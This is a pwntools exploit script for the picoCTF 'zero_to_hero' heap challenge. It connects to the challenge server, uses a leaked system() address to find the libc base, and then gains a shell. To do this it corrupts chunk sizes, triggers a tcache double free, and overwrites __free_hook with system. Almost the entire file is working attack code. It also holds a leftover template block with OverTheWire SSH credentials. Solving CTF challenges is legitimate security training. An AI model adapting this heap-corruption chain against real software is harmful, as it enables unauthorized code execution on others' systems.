from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './zero_to_hero'
LIBC = ELF('./libc.so.6') # #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('jupiter.challenges.picoctf.org',29476) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b malloc')



##########################
##### OFFSET FINDER ######
##########################

#####################
#### Find Gadgets ###
#####################

#########################
#### Finf LIBC offset ###
#########################

def add(size,content):
	P.sendlineafter(b'> ',b'1')
	P.sendlineafter(b'> ',str(size).encode())
	P.sendlineafter(b'> ',content)
	print('Add 1 power size 0x%x with content: %s' % (size,content))

def delete(index):
	P.sendlineafter(b'> ',b'2')
	P.sendlineafter(b'> ',str(index).encode())
	print('Delete power number %d' % (index))
	
def enter():
	P.sendlineafter(b'hero?',b'y')
	P.recvuntil(b'this: ')
	recv = int(P.recvline().strip(),16)
	print("leak system_libc : ",hex(recv))
	return recv


##############################
##### FINAL EXPLOITATION #####
##############################
leak = enter()
LIBC.address = leak - LIBC.symbols['system']

log.info('LIBC base @ %s' % hex(LIBC.address))

free_hook = LIBC.sym['__free_hook']
log.info('free hook @ %s' % hex(free_hook))
add(0x128,b'/bin/sh\0')	#0 
add(0x128,b'A')	#1
add(0x128,b'A')	#2
delete(2)	#=> 0x2f bin?
delete(1)	#=> 0x2f bin?
add(0x128,b'A'*0x128) #=> change index 2 size to 0x100
delete(2)	#=> double free
add(0xf8,p64(free_hook))	#
add(0x128,b'A')
add(0x128,p64(leak))
delete(0)
P.interactive() #Interact with your shell :)














